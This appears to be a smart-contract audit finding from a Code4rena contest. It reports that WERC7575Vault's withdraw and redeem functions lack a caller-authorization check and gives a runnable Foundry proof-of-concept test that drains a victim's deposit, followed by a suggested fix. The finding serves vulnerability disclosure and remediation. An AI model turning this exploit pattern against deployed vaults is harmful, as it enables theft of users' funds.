  "body": "## Summary\n`WERC7575Vault.withdraw` and `redeem` never check that `msg.sender` is the owner (or an approved delegate). They only spend the owner→owner self‑allowance required for normal withdrawals. Once a validator issues that self‑allowance permit, any address can call withdraw/redeem for that owner, burn the owner’s shares, and receive the underlying assets to an arbitrary receiver.\n\n## Impact\nFull theft of a user’s settlement assets after they obtain the required self‑allowance permit. Attacker burns the victim’s shares and transfers all assets to themselves; the victim is left with zero shares and zero assets.\n\n## Root Cause\n- `_withdraw` is invoked by both `withdraw` and `redeem` and only calls `_shareToken.spendSelfAllowance(owner, shares)` without verifying `msg.sender == owner` or spending an allowance for the caller. Permalinks: [withdraw helper](https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L397-L410), [withdraw entrypoint](https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L434-L437), [redeem entrypoint](https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L464-L467).\n- NatSpec comments claim “msg.sender must be owner OR have allowance” (e.g., lines 414‑452) but no such check exists in the code.",
  "proof_of_concept": "Runnable PoC using the contest harness (no external tooling). Added test file: `test/H1_WERC7575VaultWithdrawAuth.t.sol`.\n\nKey steps:\n1) Deploy MockAsset, WERC7575ShareToken, WERC7575Vault; register vault and KYC Alice.\n2) Alice deposits 100 tokens into the settlement vault.\n3) Validator signs an owner==spender permit for Alice (self‑allowance), which is required for her own withdrawals.\n4) Attacker submits that permit and then calls `vault.withdraw(100 ether, attacker, alice)`, draining Alice.\n\nTest code (already in repo):\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {WERC7575ShareToken} from \"src/WERC7575ShareToken.sol\";\nimport {WERC7575Vault} from \"src/WERC7575Vault.sol\";\nimport {MockAsset} from \"test/MockAsset.sol\";\n\ncontract H1_WERC7575VaultWithdrawAuthTest is Test {\n    WERC7575ShareToken share;\n    WERC7575Vault vault;\n    MockAsset asset;\n\n    address validator = vm.addr(1);\n    uint256 validatorPk = 1;\n    address alice = vm.addr(2);\n    address attacker = vm.addr(3);\n\n    function setUp() public {\n        asset = new MockAsset();\n        share = new WERC7575ShareToken(\"Wrapped USD\", \"WUSD\");\n        vault = new WERC7575Vault(address(asset), share);\n\n        share.registerVault(address(asset), address(vault));\n        share.setValidator(validator);\n        share.setKycVerified(alice, true);\n\n        asset.mint(alice, 100 ether);\n        vm.startPrank(alice);\n        asset.approve(address(vault), type(uint256).max);\n        vault.deposit(100 ether, alice);\n        vm.stopPrank();\n    }\n\n    function test_anyoneCanWithdrawWithVictimSelfAllowance() public {\n        uint256 shares = share.balanceOf(alice);\n        uint256 nonce = share.nonces(alice);\n        uint256 deadline = block.timestamp + 1 days;\n\n        bytes32 permitTypehash = keccak256(\n            \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n        );\n        bytes32 structHash = keccak256(abi.encode(permitTypehash, alice, alice, shares, nonce, deadline));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", share.DOMAIN_SEPARATOR(), structHash));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(validatorPk, digest);\n\n        vm.prank(attacker);\n        share.permit(alice, alice, shares, deadline, v, r, s);\n\n        vm.prank(attacker);\n        vault.withdraw(100 ether, attacker, alice);\n\n        assertEq(asset.balanceOf(attacker), 100 ether);\n        assertEq(share.balanceOf(alice), 0);\n    }\n}\n```\n\nRun:\n```\nforge test --match-test test_anyoneCanWithdrawWithVictimSelfAllowance\n```\nExpected: test passes; attacker receives Alice’s 100 tokens and Alice’s shares are burned.\n\n## Recommended Mitigation\nAdd caller authorization to `_withdraw` (used by both withdraw and redeem). Minimal pattern:\n```solidity\nif (msg.sender != owner) {\n    _shareToken.spendAllowance(owner, msg.sender, shares); // or revert if delegation is not desired\n}\n_shareToken.spendSelfAllowance(owner, shares); // keep validator gate\n```\nThis enforces owner-or-allowed-caller semantics while retaining the validator self‑allowance requirement.",
